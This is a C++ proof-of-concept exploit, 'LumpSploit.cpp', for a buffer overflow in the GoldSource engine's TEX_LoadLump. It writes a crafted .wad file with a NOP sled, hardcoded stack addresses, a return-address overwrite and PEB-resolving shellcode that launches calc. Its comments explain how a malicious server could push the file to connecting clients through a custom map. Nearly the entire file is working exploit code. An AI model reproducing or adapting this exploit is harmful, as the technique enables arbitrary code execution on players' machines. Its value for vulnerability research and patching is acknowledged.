/*****************************************************************
*
* LumpSploit.cpp
*
* TEX_LoadLump client-side exploit for GoldSource Engine.
*
* Allows to execute any binary code on game client via .wad files.
*
* Author: Alexander Belkin, also known as 2010kohtep.
*
* THIS PROJECT IS FOR STUDYING PURPOSES ONLY AND A PROOF-OF-CONCEPT.
* THE AUTHOR CAN NOT BE HELD RESPONSIBLE FOR ANY DAMAGE OR
* CRIMINAL ACTIVITIES DONE USING THIS PROGRAM.
*
*****************************************************************/

#include <Windows.h>
#include <iostream>  // fopen, fwrite

#include "Common/Types.h"

#include "Utils/File.h"
#include "Utils/InlineCode.h"

void shellcode()
{
	//
	// Go to the bottom of the stack to get ability to
	// allocate arguments in shellcode function.
	//

	__asm
	{
		sub esp, 0x8000;
	}

	//
	// Allocating string on the stack. We can't use global
	// memory, because we are going to use this code as shellcode,
	// what means that all global pointers will be invalid.
	//
	// Stack is the local function memory, so we can write our strings
	// here freely.
	//

	const wchar_t szKernel32[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', '\0' };
	const wchar_t szWinExec[] = { 'W', 'i', 'n', 'E', 'x', 'e', 'c', '\0' };

	auto pfnWinExec = (TWinExec)GetProcAddressPeb(szKernel32, szWinExec);
	
	const char szProcName[] = { 'c', 'a', 'l', 'c', '\0' };

	//
	// Open calculator via WinAPI function - WinExec.
	//
	// We can also use CreateProcess[A/W], but WinExec
	// is much easier and simple.
	//

	pfnWinExec(szProcName, SW_NORMAL);
} int shellcodeEnd() { return 0x01010102; }

const int TEXDATA_MAX_SIZE = 348996;
const int LUMP_SIZE = TEXDATA_MAX_SIZE + 0x800;

void *BuildShellcodeChunk()
{
	auto data = (unsigned int *)malloc(LUMP_SIZE);

	if (data)
	{
		//
		// Write NOP sled.
		//

		memset(data, 0x90, LUMP_SIZE);

#if 0
		for (int i = 0; i < LUMP_SIZE / 4; i++)
		{
			auto cell = &((int *)data)[i];
			*cell = i;
		}
#endif

		//
		// In this stack cell there's must be pointer at
		// some data, so we need to make valid pointer to
		// prevent game from crash.
		//
		// Win10 stack addr - 0x19F20C
		//

		data[0x154DF] = 0x149E80;

		// In this stack cell there's must be pointer
		// at '&mod_base[l->fileofs]', but we have rewrite
		// this in TEX_LoadLump, so we need to put something here.
		// Since there's code that checks 'nummiptex' in this
		// data, we can use -1 value to skip other checks.
		//
		// Win10 stack addr (0x19F21C) - 0x19F214
		//

		data[0x154E1] = 0x19F21C;
		
		//
		// Lump count, set this to -1 to exit from
		// cycle.
		//

		data[0x154E3] = -1;

		//
		// Needs for bypass some other checks.
		//

		data[0x154E4] = 0;

		//
		// Needs to skip 'wads_parsed' check and prevent
		// TEX_CleanupWadInfo call.
		//

		data[0x154E5] = 0;

		//
		// Insert the jmp instruction before
		// return addresses so that when the NOP sled is 
		// executed, the return address and other stack data
		// was not executed.
		//

		data[0x154E6] = 0x0DEB9090;

		//
		// Return address to Mod_LoadTextures stores here,
		// we will write our shellcode address instead.
		//

		data[0x154E7] = 0x19F238;

		//
		// Write shellcode.
		//

		auto nCodeSize = (int)shellcodeEnd - (int)shellcode;
		memcpy(&data[0x154EA], shellcode, nCodeSize);
	}

	return data;
}

void BuildExploitableWAD()
{
	FILE *f;
	fopen_s(&f, "sploit0.wad", "wb");

	wadinfo_t header = { 0 };
	{
		//
		// Must be 'WAD2' or 'WAD3'.
		//

		*(int *)&header.identification = '3DAW';

		//
		// We have only one exploitable lump in file.
		//

		header.numlumps = 1;

		//
		// Exploitable lump comes just after WAD header.
		//

		header.infotableofs = sizeof(header);
	}

	fwrite(&header, f);

	lumpinfo_t lump = { 0 };
	{
		//
		// Lump data comes after WAD and lumpinfo headers.
		//

		lump.filepos = sizeof(header) + sizeof(lumpinfo_t);

		//
		// Lump size must be more than TEXDATA_MAX_SIZE,
		// because TEXDATA_MAX_SIZE is the size of
		// 'dtexdata' variable and in this case we will
		// trigger buffer overflow situation.
		//

		lump.disksize = LUMP_SIZE;
		lump.size = LUMP_SIZE;

		lump.type = 0x43;
		lump.compression = 0;
		lump.pad1 = 0;
		lump.pad2 = 0;

		strcpy_s(lump.name, "-0cstrike_fj2dk");
	}

	fwrite(&lump, f);

	miptex_t mt = { 0 };
	{
		//
		// Name must not be 'DEFAULT' to avoid 'Mod_AdSwap' call.
		// Name is also must be '\0' to avoid crash in 'GL_LoadTexture'.
		//

		strcpy_s(mt.name, "");

		//
		// 'height' and 'width' fields must be aligned by
		// 16, otherwise 'Sys_Error' will be called with
		// error 'Texture is not 16 aligned'.
		//
		// We can't use 0 because in that case division by zero
		// error will happen.
		//

		mt.height = 16;
		mt.width = 16;

		mt.offsets[0] = mt.offsets[1] = mt.offsets[2] = mt.offsets[3] = 0;
	}

	fwrite(&mt, f);

	//
	// Allocate shellcode data on the heap, because
	// my VS configurations can't handle 'data[nLumpSize]' on
	// the stack.
	//

	auto data = BuildShellcodeChunk();
	if (!data)
	{
		printf("Failed to allocate chunk. What?\n");
		system("pause");

		return;
	}

	fwrite(data, LUMP_SIZE, 1, f);

	//
	// Exploitable 'sploit0.wad' is created. 
	//
	// Server-side attacker can create custom map, that
	// will be downloaded by client, including exploitable WAD file,
	// and WAD file will be loaded while client connecting to server.
	//

	fclose(f);
}

int main()
{
	// Call stack:
	//   [0] SV_SpawnServer
	//   [1] Mod_ForName("maps/cs_office.bsp", 0, 0)
	//   [2] Mod_LoadModel(mod [model_t *], crash, trackCRC)
	//   [3] Mod_LoadBrushModel(mod [model_t *], "maps/cs_office.bsp")
	//   [4] Mod_LoadTextures(lump [lump_t *])
	//   [5] TEX_LoadLump("+0elev_down2", &dtexdata) returned 2172; <- Buffer overflow here in 'dtexdata'

	BuildExploitableWAD();

	return 0;
}